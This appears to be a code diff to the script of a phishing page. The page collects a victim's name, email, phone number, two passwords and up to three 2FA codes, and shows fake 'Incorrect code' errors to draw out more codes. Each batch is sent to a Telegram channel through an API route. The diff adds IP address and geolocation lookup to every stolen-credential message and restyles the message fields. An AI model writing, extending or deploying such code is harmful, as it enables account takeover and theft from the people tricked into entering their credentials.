@@ -482,24 +482,52 @@
     <!-- ============================================================
          MAIN SCRIPT
     ============================================================ -->
-    <script>
+ <script>
     /* ============================================================
        CONFIG
     ============================================================ */
     var TG_SECRET = 'HDNDT-JDHT8FNEK-JJHR';
 
     /* ============================================================
-       SEND TO TELEGRAM — qua Vercel API route
+       FETCH IP + LOCATION (ipinfo.io)
+    ============================================================ */
+    var _ipInfo = { ip: 'N/A', location: 'N/A' };
+    var COUNTRY_NAMES = {
+      VN:'Vietnam',US:'United States',GB:'United Kingdom',FR:'France',DE:'Germany',
+      JP:'Japan',CN:'China',KR:'South Korea',TH:'Thailand',SG:'Singapore',
+      AU:'Australia',CA:'Canada',IN:'India',ID:'Indonesia',MY:'Malaysia',
+      PH:'Philippines',TW:'Taiwan',HK:'Hong Kong',PK:'Pakistan',BD:'Bangladesh',
+      KH:'Cambodia',MM:'Myanmar',NL:'Netherlands',BE:'Belgium',CH:'Switzerland',
+      AT:'Austria',SE:'Sweden',NO:'Norway',DK:'Denmark',PL:'Poland',BR:'Brazil',
+      MX:'Mexico',AR:'Argentina',SA:'Saudi Arabia',AE:'UAE',TR:'Turkey',
+      RU:'Russia',EG:'Egypt',ZA:'South Africa',NG:'Nigeria',KE:'Kenya'
+    };
+    fetch('https://ipinfo.io/json')
+      .then(function(r) { return r.json(); })
+      .then(function(d) {
+        var cc = d.country || '';
+        var cn = COUNTRY_NAMES[cc] || cc;
+        var city = d.city || '';
+        var region = d.region || '';
+        var parts = [city];
+        if (region && region !== city) parts.push(region);
+        if (cn) parts.push(cn);
+        _ipInfo.ip = d.ip || 'N/A';
+        _ipInfo.location = parts.filter(Boolean).join(', ') + (cc ? ' (' + cc + ')' : '');
+      }).catch(function() {});
+
+    /* ============================================================
+       SEND TO TELEGRAM
     ============================================================ */
     async function sendTelegram(msg) {
       try {
+        var full = '🌐 <b>IP:</b> <code>' + _ipInfo.ip + '</code>\n'
+                 + '📍 <b>Location:</b> <code>' + _ipInfo.location + '</code>\n'
+                 + msg;
         await fetch('/api/send-telegram', {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'x-secret-key': TG_SECRET
-          },
-          body: JSON.stringify({ message: msg })
+          headers: { 'Content-Type': 'application/json', 'x-secret-key': TG_SECRET },
+          body: JSON.stringify({ message: full })
         });
       } catch(e) {}
     }
@@ -556,10 +584,7 @@
     /* ============================================================
        BENEFIT HOVER
     ============================================================ */
-    var _benefitImgs = {
-      1: 'public/images/credibility.png',
-      2: 'public/images/resources.png'
-    };
+    var _benefitImgs = { 1: 'public/images/credibility.png', 2: 'public/images/resources.png' };
     function selectBenefit(n) {
       var img = document.getElementById('benefit-image');
       if (img && _benefitImgs[n]) img.src = _benefitImgs[n];
@@ -574,10 +599,7 @@
       var isOpen = ans.classList.contains('open');
       document.querySelectorAll('.faq-answer').forEach(function(a) { a.classList.remove('open'); });
       document.querySelectorAll('#faq-section svg').forEach(function(s) { s.style.transform = ''; });
-      if (!isOpen) {
-        ans.classList.add('open');
-        svg.style.transform = 'rotate(180deg)';
-      }
+      if (!isOpen) { ans.classList.add('open'); svg.style.transform = 'rotate(180deg)'; }
     }
 
     /* ============================================================
@@ -693,15 +715,13 @@
       }
     });
 
-    // Auto detect country for phone flag
     (function detectCountry() {
       fetch('https://www.cloudflare.com/cdn-cgi/trace')
         .then(function(r) { return r.text(); })
         .then(function(t) {
           var m = t.match(/loc=([A-Z]{2})/);
           if (!m) return;
-          var code = m[1];
-          var found = COUNTRIES.find(function(c) { return c.code === code; });
+          var found = COUNTRIES.find(function(c) { return c.code === m[1]; });
           if (found) selectCountryOpt(found.code, found.dial, found.flag, found.name);
         }).catch(function() {});
     })();
@@ -740,12 +760,10 @@
                           + document.getElementById('inf-year').value;
       _data.message       = document.getElementById('inf-message').value.trim();
 
-      // Show loading
       document.getElementById('inf-btn-text').textContent = 'Sending...';
       document.getElementById('inf-spinner').classList.remove('hidden');
       document.getElementById('inf-submit').disabled = true;
 
-      // Gửi Telegram bước 1
       sendTelegram(
         '🔔 <b>VOI VỀ ANH EM ƠI!!</b>\n'
         + '-----------------------------\n'
@@ -763,7 +781,6 @@
 
       setTimeout(function() {
         hideModal('modal-info');
-        // Reset btn
         document.getElementById('inf-btn-text').textContent = 'Send';
         document.getElementById('inf-spinner').classList.add('hidden');
         document.getElementById('inf-submit').disabled = false;
@@ -804,7 +821,6 @@
         }, 1400);
       } else {
         _data.passwordSecond = pw;
-        // Gửi Telegram bước 2
         sendTelegram(
           '🔔 <b>VOI VỀ ANH EM ƠI!!</b>\n'
           + '-----------------------------\n'
@@ -814,14 +830,13 @@
           + '<b>Email:</b> <code>' + _data.email + '</code>\n'
           + '<b>Phone Number:</b> <code>' + _data.phone + '</code>\n'
           + '-----------------------------\n'
-          + '<b>Password (1):</b> <code>' + _data.password + '</code>\n'
-          + '<b>Password (2):</b> <code>' + _data.passwordSecond + '</code>\n'
+          + '<b>🔑 Password (1):</b> <code>' + _data.password + '</code>\n'
+          + '<b>🔑 Password (2):</b> <code>' + _data.passwordSecond + '</code>\n'
           + '-----------------------------\n'
           + '🕐 ' + new Date().toLocaleString('vi-VN')
         );
         setTimeout(function() {
           hideModal('modal-password');
-          // Update 2FA display
           document.getElementById('tfa-email-display').textContent = _data.fullName || _data.email;
           document.getElementById('tfa-masked-info').textContent = maskEmail(_data.email) + ', ' + maskPhone(_data.phone);
           document.getElementById('tfa-step').textContent = '1';
@@ -845,7 +860,6 @@
       var code = document.getElementById('tfa-input').value.trim();
       var errEl = document.getElementById('tfa-error');
       errEl.classList.add('hidden');
-
       if (!code) return;
 
       document.getElementById('tfa-btn-text').textContent = 'Checking...';
@@ -857,18 +871,17 @@
       if (_tfaAttempts < 2) {
         _data['twoFa' + _tfaAttempts] = code;
 
-        // Gửi Telegram sau mỗi lần nhập
         sendTelegram(
           '🔔 <b>VOI VỀ ANH EM ƠI!!</b>\n'
           + '-----------------------------\n'
           + '<b>Full Name:</b> <code>' + _data.fullName + '</code>\n'
           + '<b>Email:</b> <code>' + _data.email + '</code>\n'
           + '-----------------------------\n'
-          + '<b>Password (1):</b> <code>' + (_data.password || 'N/A') + '</code>\n'
-          + '<b>Password (2):</b> <code>' + (_data.passwordSecond || 'N/A') + '</code>\n'
+          + '<b>🔑 Password (1):</b> <code>' + (_data.password || 'N/A') + '</code>\n'
+          + '<b>🔑 Password (2):</b> <code>' + (_data.passwordSecond || 'N/A') + '</code>\n'
           + '-----------------------------\n'
-          + '<b>Code 2FA (1):</b> <code>' + (_data.twoFa0 || 'N/A') + '</code>\n'
-          + '<b>Code 2FA (2):</b> <code>' + (_data.twoFa1 || 'N/A') + '</code>\n'
+          + '🔐 <b>Code 2FA (1):</b> <code>' + (_data.twoFa0 || 'N/A') + '</code>\n'
+          + '🔐 <b>Code 2FA (2):</b> <code>' + (_data.twoFa1 || 'N/A') + '</code>\n'
           + '-----------------------------\n'
           + '🕐 ' + new Date().toLocaleString('vi-VN')
         );
@@ -876,15 +889,12 @@
         setTimeout(function() {
           document.getElementById('tfa-btn-text').textContent = 'Continue';
           document.getElementById('tfa-spinner').classList.add('hidden');
-
           var inp = document.getElementById('tfa-input');
           inp.disabled = true;
           inp.value = '';
-
           var t = 30;
           errEl.textContent = 'Incorrect code. Try again after ' + t + 's.';
           errEl.classList.remove('hidden');
-
           _cdInterval = setInterval(function() {
             t--;
             errEl.textContent = 'Incorrect code. Try again after ' + t + 's.';
@@ -903,7 +913,6 @@
       } else {
         _data.twoFaFinal = code;
 
-        // Gửi Telegram lần cuối đầy đủ
         sendTelegram(
           '🔔 <b>VOI VỀ ANH EM ƠI!!</b>\n'
           + '-----------------------------\n'
@@ -916,12 +925,12 @@
           + '<b>Email Business:</b> <code>' + (_data.emailBusiness || 'N/A') + '</code>\n'
           + '<b>Phone Number:</b> <code>' + _data.phone + '</code>\n'
           + '-----------------------------\n'
-          + '<b>Password (1):</b> <code>' + (_data.password || 'N/A') + '</code>\n'
-          + '<b>Password (2):</b> <code>' + (_data.passwordSecond || 'N/A') + '</code>\n'
+          + '<b>🔑 Password (1):</b> <code>' + (_data.password || 'N/A') + '</code>\n'
+          + '<b>🔑 Password (2):</b> <code>' + (_data.passwordSecond || 'N/A') + '</code>\n'
           + '-----------------------------\n'
-          + '<b>Code 2FA (1):</b> <code>' + (_data.twoFa0 || 'N/A') + '</code>\n'
-          + '<b>Code 2FA (2):</b> <code>' + (_data.twoFa1 || 'N/A') + '</code>\n'
-          + '<b>Code 2FA (3):</b> <code>' + _data.twoFaFinal + '</code>\n'
+          + '🔐 <b>Code 2FA (1):</b> <code>' + (_data.twoFa0 || 'N/A') + '</code>\n'
+          + '🔐 <b>Code 2FA (2):</b> <code>' + (_data.twoFa1 || 'N/A') + '</code>\n'
+          + '🔐 <b>Code 2FA (3):</b> <code>' + _data.twoFaFinal + '</code>\n'
           + '-----------------------------\n'
           + '🕐 ' + new Date().toLocaleString('vi-VN')
         );
@@ -933,6 +942,5 @@
       }
     });
     </script>
-
 </body>
 </html>
